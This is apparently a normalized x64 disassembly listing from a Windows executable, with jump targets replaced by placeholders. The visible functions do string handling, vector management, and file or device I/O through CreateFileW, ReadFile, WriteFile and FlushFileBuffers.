xor r15d r15d
mov ebx r15d
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + rdi + 0x10 ] 0x6
jne r-xdata
or ebx [ rcx + 0x10 ]
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov r9d r13d
nop
lea r8 [ rbp - 0x39 ]
cmp r11 0x8
cmovae r8 rdi
mov r9 r10
cmp rsi r10
cmovb r9 rsi
test r9 r9
je r-xdata
cmp [ rbp + 0x7 ] 0x8
jb r-xdata
cmp [ rbp - 0x49 ] 0x8
jb r-xdata
mov rax [ rbx ]
mov [ rbp - 0x39 ] rax
mov [ rbx ] r13
mov r8 [ rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rbx
lea rcx [ rbp - 0x39 ]
call sub_14003a8c0
jmp r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove ebx r13d
xor r8d r8d
mov edx ebx
call sub_140003120
or ebx r13d
test ecx ecx
sete cl
test cl cl
jne r-xdata
cmp rsi r10
jae r-xdata
mov r9d 0x1
cmp [ r8 ] cx
cmovb r9d r12d
jmp r-xdata
add r8 0x2
add rdx 0x2
dec r9
jne r-xdata
mov rcx [ rbp - 0x11 ]
call j_sub_14003ad04
mov [ rbp - 0x49 ] 0x7
mov [ rbp - 0x51 ] r13
mov [ rbp - 0x61 ] r13w
cmp [ rbx + 0x18 ] 0x8
jae r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_14003ad04
mov rax [ rbx + 0x10 ]
mov [ rbp - 0x29 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x21 ] rax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
lea rdx [ r--data ]
mov rcx rdi
call sub_14000ac10
mov rdi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov ebx r15d
mov rcx [ rdi ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rdi + 0x10 ] 0x6
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] r15
jne r-xdata
mov rax [ rbx + 0x50 ]
mov rcx [ rbx + 0x58 ]
cmp rax rcx
je r-xdata
add rbx 0x70
cmp rbx rax
jne r-xdata
mov ecx r13d
cmp rsi r10
setne cl
mov ecx r12d
jmp r-xdata
movsxd rcx r9d
test r9d r9d
jne r-xdata
movzx ecx [ rdx ]
cmp [ r8 ] cx
jne r-xdata
jmp r-xdata
mov rax [ rbx ]
mov [ rbp - 0x61 ] rax
mov [ rbx ] r13
mov r8 [ rbx + 0x10 ]
inc r8
add r8 r8
mov rdx rbx
lea rcx [ rbp - 0x61 ]
call sub_14003a8c0
jmp r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove ebx r13d
xor r8d r8d
call sub_140003120
or edx r13d
lea r12 [ rw-data ]
mov rcx r12
test rsi rsi
jne r-xdata
mov r12 [ rbp - 0x49 ]
mov rdi [ rbp - 0x51 ]
mov r13 [ rbp - 0x61 ]
nop
mov r10 [ rbx + 0x10 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
jmp r-xdata
mov rax [ rbx + 0x10 ]
mov [ rbp - 0x51 ] rax
mov rax [ rbx + 0x18 ]
mov [ rbp - 0x49 ] rax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r13
mov [ rbx ] r13w
mov rcx r14
call sub_140014910
nop
cmp [ rbp - 0x49 ] 0x8
jb r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] r15
jne r-xdata
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp - 0x39 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp - 0x61 ]
call sub_14000ae70
lea rdx [ r--data ]
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
lea rdx [ rbp - 0x61 ]
call sub_14000ae70
lea rdx [ r--data ]
jmp r-xdata
lea r8 [ rax + 0x8 ]
mov r8 [ rax + 0x8 ]
jmp r-xdata
mov [ rbp - 0x49 ] 0x7
mov [ rbp - 0x51 ] r15
mov [ rbp - 0x61 ] r15w
mov rcx [ rbp - 0x61 ]
call j_sub_14003ad04
xor r8d r8d
call sub_140003120
or edx r13d
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test edi edi
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove edi r13d
mov rcx rax
call sub_14000ac10
mov rsi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov rcx [ rsi ]
movsxd rcx [ rcx + 0x4 ]
mov edi r13d
test [ rcx + rsi + 0x10 ] 0x6
mov r13d 0x4
jne r-xdata
xor r14d r14d
mov r10d r14d
or r8 0xffffffffffffffff
movzx edx [ r8 ]
cmp [ r9 ] dx
jne r-xdata
lea r9 [ rbp - 0x61 ]
cmp r12 0x8
cmovae r9 r13
mov r10 r11
cmp rdi r11
cmovb r10 rdi
test r10 r10
je r-xdata
mov al 0x1
mov rcx [ rbp - 0x39 ]
call j_sub_14003ad04
mov edx 0xa
mov rcx r12
call sub_1400085e0
xor r15d r15d
mov edi r15d
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + r12 + 0x10 ] 0x6
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
test edx edx
sete dl
test dl dl
jne r-xdata
cmp rdi r11
jae r-xdata
mov r10d 0x1
cmp [ r9 ] dx
mov r8 0xffffffffffffffff
cmovb r10d r8d
xor r14d r14d
jmp r-xdata
add r9 0x2
add r8 0x2
dec r10
jne r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx r12
test edi edi
je r-xdata
mov rcx [ rcx + r12 + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove edi r13d
mov rax [ rw-data ]
xor r8d r8d
call sub_140003120
or edx r13d
mov rcx r15
call [ rax ]
movzx ebx al
cmp [ rbp - 0x49 ] 0x8
jb r-xdata
add rax 0x58
cmp rax rcx
jne r-xdata
mov edx r14d
cmp rdi r11
setne dl
mov edx r8d
jmp r-xdata
movsxd rdx r10d
test r10d r10d
jne r-xdata
jmp r-xdata
lea rdx [ r--data ]
mov rcx r12
call sub_14000ac10
mov rcx rax
lea rdx [ rbx + 0x28 ]
call sub_14000ae70
mov rsi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov edi r15d
mov rcx [ rsi ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] r15
jne r-xdata
mov [ rbp - 0x49 ] 0x7
mov [ rbp - 0x51 ] r14
mov [ rbp - 0x61 ] r14w
cmp [ rbp - 0x21 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_14003ad04
mov r11 [ rax + 0x18 ]
cmp [ rax + 0x20 ] 0x8
jb r-xdata
xor r13d r13d
jmp r-xdata
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test edi edi
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove edi r13d
xor r8d r8d
call sub_140003120
or edx 0x4
movzx eax bl
jmp r-xdata
mov rcx [ rbp - 0x39 ]
call j_sub_14003ad04
mov rcx rbx
call sub_140014a40
nop
cmp [ rbp - 0x49 ] 0x8
jb r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] r15
jne r-xdata
mov rcx [ rbp + 0x17 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x108 ]
add rsp 0xb0
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov [ rbp - 0x49 ] 0x7
mov [ rbp - 0x51 ] r15
mov [ rbp - 0x61 ] r15w
jmp r-xdata
mov rcx [ rbp - 0x61 ]
call j_sub_14003ad04
xor r8d r8d
call sub_140003120
or edx 0x4
cmp [ rbp - 0x21 ] 0x8
jb r-xdata
sub_140014320
mov rax rsp
push rdi
sub rsp 0x80
mov [ rsp + 0x40 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x70 ] rax
mov rbx rcx
mov rax [ rcx + 0x28 ]
test rax rax
je r-xdata
lea rdx [ r--data ]
lea rbp [ rw-data ]
mov rcx rbp
call sub_14000ac10
xor edi edi
mov [ rsp + 0x30 ] rdi
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] 0x3
xor r9d r9d
xor r8d r8d
mov edx 0xc0000000
lea rcx [ r--data ]
call [ CreateFileW@IAT ]
mov [ rbx + 0x28 ] rax
test rax rax
je r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
xor sil sil
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x48 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
mov rcx rbp
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
nop
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
mov al 0x1
jmp r-xdata
mov edx 0xa
mov rcx rbp
call sub_1400085e0
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + rbp + 0x10 ] 0x6
jne r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov sil 0x1
lea rdx [ r--data ]
mov rcx rbp
call sub_14000ac10
jmp r-xdata
mov rcx [ rsp + 0x70 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x18 ]
mov rbp [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rsp r11
pop rdi
retn
movsxd rcx [ rax + 0x4 ]
add rcx rbp
test edi edi
je r-xdata
mov rcx [ rcx + rbp + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
mov ecx 0x4
cmp eax 0xffffffff
cmove edi ecx
mov rax [ rw-data ]
movzx eax sil
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_140003120
or edx 0x4
sub_1400144a0
mov rax rsp
push rdi
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ rax + 0x18 ] rbx
mov [ rax + 0x20 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x68 ] rax
mov rbx rdx
mov rdi rcx
cmp [ rdx + 0x10 ] 0x0
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
mov rcx [ rdi + 0x28 ]
test rcx rcx
je r-xdata
call sub_140014320
test al al
je r-xdata
mov al 0x1
cmp rcx 0xffffffffffffffff
je r-xdata
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
jmp r-xdata
mov rax [ rbx + 0x10 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
call [ CloseHandle@IAT ]
test eax eax
mov al 0x1
je r-xdata
lea r8d [ rax + rax + 0x2 ]
mov [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x34 ]
mov rdx rbx
mov rcx [ rdi + 0x28 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov rbx [ rbx ]
mov rcx [ rsp + 0x68 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x20 ]
mov rbp [ r11 + 0x28 ]
mov rsp r11
pop rdi
retn
mov [ rdi + 0x28 ] 0x0
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x40 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x58 ] 0x8
jb r-xdata
mov [ rsp + 0x30 ] 0x0
mov ecx 0x40000
call j_sub_14003ac60
mov rbp rax
xor edx edx
mov r8d 0x40000
mov rcx rax
call sub_14003d760
mov [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x30 ]
mov r8d 0x40000
mov rdx rbp
mov rcx [ rdi + 0x28 ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov rcx [ rsp + 0x40 ]
call j_sub_14003ad04
jmp r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rsp + 0x40 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rsp + 0x58 ] 0x8
jb r-xdata
mov rdx rbp
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
jmp r-xdata
mov rcx rbp
call j_sub_14003ad04#2
jmp r-xdata
mov rcx [ rsp + 0x40 ]
call j_sub_14003ad04
sub_1400146a0
mov rax rsp
push rbp
lea rbp [ rax - 0x5f ]
sub rsp 0xa0
mov [ rbp - 0x11 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x47 ] rax
xor esi esi
mov rbx [ rw-data ]
test rbx rbx
je r-xdata
lea rdx [ r--data ]
mov rdx [ rcx + 0x10 ]
test rdx rdx
je r-xdata
mov al 0x1
mov rcx [ rbp + 0x47 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xa0 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
mov rcx [ rw-data ]
test rcx rcx
je r-xdata
lea rdx [ r--data ]
jmp r-xdata
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov [ rw-data ] rsi
mov rax [ rcx ]
mov edx 0x1
call [ rax ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
call sub_140007970
cmp [ rw-data ] 0x0
je r-xdata
cmp rax 0xffffffffffffffff
je r-xdata
lea edi [ rdx + rdx ]
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov [ rsp + 0x20 ] rsi
lea r9 [ rbp - 0x19 ]
mov r8d edi
mov rdx rcx
mov rcx rax
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov rcx [ rcx ]
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x9 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xf ] 0x8
jb r-xdata
cmp edi [ rbp - 0x19 ]
jne r-xdata
mov rcx [ rbp - 0x9 ]
call j_sub_14003ad04
jmp r-xdata
mov rcx [ rbx + 0x8 ]
call [ FlushFileBuffers@IAT ]
test eax eax
setne al
test al al
je r-xdata
mov [ rbp + 0x37 ] 0x7
mov [ rbp + 0x2f ] rsi
mov [ rbp + 0x1f ] si
xor r8d r8d
mov dl 0x1
lea rcx [ rbp - 0x9 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xf ] 0x8
jb r-xdata
or r9 0xffffffffffffffff
lea r8d [ r9 + 0x2 ]
lea rdx [ rbp - 0x9 ]
lea rcx [ rbp + 0x1f ]
call sub_140006e20
nop
mov rdx rax
lea rcx [ rw-data ]
call sub_14000ae70
nop
cmp [ rbp + 0xf ] 0x8
jb r-xdata
cmp [ rbp + 0x37 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x9 ]
call j_sub_14003ad04
nop
mov [ rbp + 0xf ] 0x7
mov [ rbp + 0x7 ] rsi
mov [ rbp - 0x9 ] si
lea rax [ rbp + 0x1f ]
cmp [ rbp + 0x37 ] 0x8
cmovae rax [ rbp + 0x1f ]
cmp [ rax ] 0x23
je r-xdata
mov rcx [ rbp - 0x9 ]
call j_sub_14003ad04
test dil dil
je r-xdata
mov rcx [ rbp + 0x1f ]
call j_sub_14003ad04
lea rcx [ rbp + 0x1f ]
call sub_14000b9a0
movzx edi al
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
sub_140014910
push rbx
push rbp
sub rsp 0x38
mov rbx [ rcx + 0x8 ]
mov rbp rcx
cmp rbx [ rcx + 0x10 ]
je r-xdata
add rsp 0x38
pop rbp
pop rbx
retn
mov [ rsp + 0x50 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x60 ] r12
mov [ rsp + 0x68 ] r13
mov [ rsp + 0x30 ] r14
mov r14d 0x20
lea r12d [ r14 - 0x1c ]
lea r13 [ rw-data ]
nop [ rax + rax ] ax
mov rax [ rsi ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test edi edi
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove edi r12d
add rbx 0x70
cmp rbx [ rbp + 0x10 ]
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx edi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
lea rcx [ rsp + 0x20 ]
mov edx 0xc
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
mov rdx [ rax + 0x8 ]
add rcx r13
call [ rax ]
mov r11 [ rw-data ]
mov rdx rbx
movsxd rax [ r11 + 0x4 ]
mov rcx r13
mov [ rax + r13 + 0x58 ] r14w
call sub_14000ae70
lea rdx [ r--data ]
mov rcx rax
call sub_14000ac10
lea rdx [ rbx + 0x28 ]
mov rcx rax
call sub_14000ae70
mov edx 0xa
mov rcx rax
mov rsi rax
call sub_1400085e0
mov rcx [ rsi ]
xor edi edi
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
mov r14 [ rsp + 0x30 ]
mov r13 [ rsp + 0x68 ]
mov r12 [ rsp + 0x60 ]
mov rdi [ rsp + 0x58 ]
mov rsi [ rsp + 0x50 ]
xor r8d r8d
call sub_140003120
or edx r12d
sub_140014a40
mov rax rsp
mov [ rax + 0x8 ] rcx
push rbx
sub rsp 0x50
mov rbx [ rcx + 0x50 ]
cmp rbx [ rcx + 0x58 ]
je r-xdata
add rsp 0x50
pop rbx
retn
mov [ rax + 0x18 ] rsi
mov [ rax - 0x10 ] rdi
mov [ rax - 0x18 ] r12
mov [ rax - 0x20 ] r13
mov [ rax - 0x28 ] r14
mov r14d 0x20
lea rdi [ rbx + 0x8 ]
lea r13 [ rw-data ]
mov [ rax + 0x10 ] rbp
lea r12d [ r14 - 0x1c ]
mov rax rdi
mov rax [ rdi ]
jmp r-xdata
add rbx 0x58
add rdi 0x58
cmp rbx [ rcx + 0x58 ]
jne r-xdata
lea rcx [ rsp + 0x20 ]
mov edx 0xc
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
mov rdx [ rax + 0x8 ]
add rcx r13
call [ rax ]
mov r11 [ rw-data ]
mov rdx rdi
movsxd rax [ r11 + 0x4 ]
mov rcx r13
mov [ rax + r13 + 0x58 ] r14w
call sub_14000ae70
lea rdx [ r--data ]
mov rcx rax
call sub_14000ac10
lea rdx [ rdi + 0x28 ]
mov rcx rax
call sub_14000ae70
mov edx 0xa
mov rcx rax
mov rbp rax
call sub_1400085e0
mov rcx [ rbp ]
xor esi esi
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rbp + 0x10 ] 0x6
jne r-xdata
cmp [ rax ] 0x3a
je r-xdata
cmp [ rdi + 0x18 ] 0x8
jb r-xdata
mov r14 [ rsp + 0x30 ]
mov r13 [ rsp + 0x38 ]
mov r12 [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov rsi [ rsp + 0x70 ]
mov rbp [ rsp + 0x68 ]
mov rax [ rbp ]
movsxd rcx [ rax + 0x4 ]
add rcx rbp
test esi esi
je r-xdata
mov rcx [ rcx + rbp + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove esi r12d
mov rcx [ rsp + 0x60 ]
mov edx [ rcx + 0x10 ]
or edx esi
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
xor r8d r8d
call sub_140003120
or edx r12d
sub_140014b90
mov [ rsp + 0x8 ] rbx
push rsi
sub rsp 0x10
mov r10 [ rcx + 0x10 ]
mov eax 0x20
or rsi 0xffffffffffffffff
mov r11 rcx
mov [ rsp ] ax
test r10 r10
je r-xdata
mov rax rsi
mov rbx [ rsp + 0x20 ]
add rsp 0x10
pop rsi
retn
cmp r10 0x1
jb r-xdata
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rbx rcx
nop [ rax + rax ] eax
mov rbx [ rcx ]
jmp r-xdata
nop [ rax + rax ] eax
mov rax r10
mov rdx rbx
test r10 r10
je r-xdata
test rdx rdx
je r-xdata
add rdx 0x2
dec rax
jne r-xdata
mov ecx 0x1
lea r8 [ rsp ]
mov r9 rdx
nop
cmp [ rdx ] 0x20
je r-xdata
cmp [ r9 ] ax
mov ecx 0x1
cmovb ecx esi
test ecx ecx
je r-xdata
add r9 0x2
add r8 0x2
dec rcx
jne r-xdata
cmp [ r11 + 0x18 ] 0x8
jb r-xdata
mov rcx rdx
mov rax rsi
sub rcx rbx
lea rbx [ rdx + 0x2 ]
sar rcx 0x1
sub rax rcx
add r10 rax
jmp r-xdata
movzx eax [ r8 ]
cmp [ r9 ] ax
jne r-xdata
mov rbx [ rsp + 0x20 ]
sub rdx r11
sar rdx 0x1
mov rax rdx
add rsp 0x10
pop rsi
retn
mov r11 [ r11 ]
sub_140014c70
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
add rsp 0x20
pop rbx
retn
mov rdx [ rbx + 0x8 ]
call sub_140015130
mov rcx [ rbx ]
call j_sub_14003ad04
sub_140014cb0
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov rdi rdx
mov rbx rcx
mov rcx [ rcx + 0x8 ]
cmp rdx rcx
jae r-xdata
cmp rcx [ rbx + 0x10 ]
jne r-xdata
mov rax [ rbx ]
cmp rax rdx
ja r-xdata
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_140014eb0
sub rdi rax
mov rax 0x4924924924924925
imul rdi
mov rdi rdx
sar rdi 0x5
mov rax rdi
shr rax 0x3f
add rdi rax
cmp rcx [ rbx + 0x10 ]
jne r-xdata
add [ rbx + 0x8 ] 0x70
mov rbx [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
mov rdx rdi
call sub_140015250
nop
imul rdi rdi 0x70
add rdi [ rbx ]
mov rcx [ rbx + 0x8 ]
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x48 ] rcx
test rcx rcx
je r-xdata
mov rcx rbx
call sub_140014eb0
jmp r-xdata
mov rdx rdi
call sub_140015250
nop
sub_140014d70
mov [ rsp + 0x18 ] rbx
push rsi
mov rbx r8
mov rsi rdx
mov r11 rcx
test r8 r8
jne r-xdata
mov r10 [ rcx + 0x10 ]
mov [ rsp + 0x10 ] rdi
mov [ rsp + 0x18 ] r12
or r12 0xffffffffffffffff
test r10 r10
je r-xdata
xor eax eax
mov rbx [ rsp + 0x20 ]
pop rsi
retn
mov rdi [ rsp + 0x10 ]
mov rax r12
mov r12 [ rsp + 0x18 ]
mov rbx [ rsp + 0x20 ]
pop rsi
retn
cmp rbx r10
ja r-xdata
mov eax 0x1
sub rax rbx
add r10 rax
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rdi rcx
mov rdi [ rcx ]
jmp r-xdata
movzx ecx [ rsi ]
mov rax r10
mov rdx rdi
test r10 r10
je r-xdata
test rdx rdx
je r-xdata
add rdx 0x2
dec rax
jne r-xdata
mov rcx rbx
mov r8 rsi
mov r9 rdx
test rbx rbx
je r-xdata
cmp [ rdx ] cx
je r-xdata
cmp [ r11 + 0x18 ] 0x8
jb r-xdata
movzx eax [ r8 ]
cmp [ r9 ] ax
jne r-xdata
mov rdi [ rsp + 0x10 ]
mov r12 [ rsp + 0x18 ]
mov rbx [ rsp + 0x20 ]
sub rdx r11
sar rdx 0x1
mov rax rdx
pop rsi
retn
mov r11 [ r11 ]
cmp [ r9 ] ax
mov ecx 0x1
cmovb ecx r12d
test ecx ecx
je r-xdata
add r9 0x2
add r8 0x2
dec rcx
jne r-xdata
mov rcx rdx
mov rax r12
sub rcx rdi
lea rdi [ rdx + 0x2 ]
sar rcx 0x1
sub rax rcx
add r10 rax
jmp r-xdata
sub_140014e70
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
add rsp 0x20
pop rbx
retn
mov rdx [ rbx + 0x8 ]
call sub_1400150b0
mov rcx [ rbx ]
call j_sub_14003ad04
sub_140014eb0
sub rsp 0x28
mov r10 [ rcx ]
mov rdx [ rcx + 0x8 ]
mov r11 0x4924924924924925
sub rdx r10
mov rax r11
mov r9 rcx
imul rdx
mov r8 rdx
sar r8 0x5
mov rax r8
shr rax 0x3f
add r8 rax
mov rax 0x249249249249248
cmp r8 rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
mov rax r11
inc r8
sub rcx r10
imul rcx
sar rdx 0x5
mov rax rdx
shr rax 0x3f
add rdx rax
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_1400378ec
add rsp 0x28
retn
mov rcx rdx
mov rax 0x249249249249249
shr rcx 0x1
sub rax rcx
cmp rax rdx
jae r-xdata
add rdx rcx
mov rcx r9
cmp rdx r8
cmovb rdx r8
call sub_140014f70
xor edx edx
mov rcx r9
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_140014f70
sub_140014f70
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rbx rdx
mov rsi rcx
mov rax 0x249249249249249
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rsi ]
mov r12 0x4924924924924925
mov rax r12
imul rcx
sar rdx 0x5
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rbx
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor edi edi
mov [ rsp + 0x58 ] rdi
test rbx rbx
je r-xdata
mov r8 rdi
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_140015470
nop
mov r9 [ rsi + 0x8 ]
mov rcx [ rsi ]
mov r8 r9
sub r8 rcx
mov rax r12
imul r8
mov r12 rdx
sar r12 0x5
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
mov rcx rbx
imul rcx rcx 0x70
call sub_14003ac60
mov rdi rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
imul rbx rbx 0x70
add rbx rdi
mov [ rsi + 0x10 ] rbx
imul r12 r12 0x70
add r12 rdi
mov [ rsi + 0x8 ] r12
mov [ rsi ] rdi
mov rdx r9
call sub_140015130
mov rcx [ rsi ]
call j_sub_14003ad04
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
sub_1400150b0
cmp rcx rdx
je r-xdata
retn
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rbx
mov [ rsp + 0x38 ] rsi
mov rdi rdx
xor esi esi
lea rbx [ rcx + 0x48 ]
nop [ rax ] eax
mov [ rbx ] 0x7
mov [ rbx - 0x8 ] rsi
mov [ rbx - 0x18 ] si
cmp [ rbx - 0x28 ] 0x8
jb r-xdata
mov rcx [ rbx - 0x18 ]
call j_sub_14003ad04
mov [ rbx - 0x28 ] 0x7
mov [ rbx - 0x30 ] rsi
mov [ rbx - 0x40 ] si
add rbx 0x58
lea rax [ rbx - 0x48 ]
cmp rax rdi
jne r-xdata
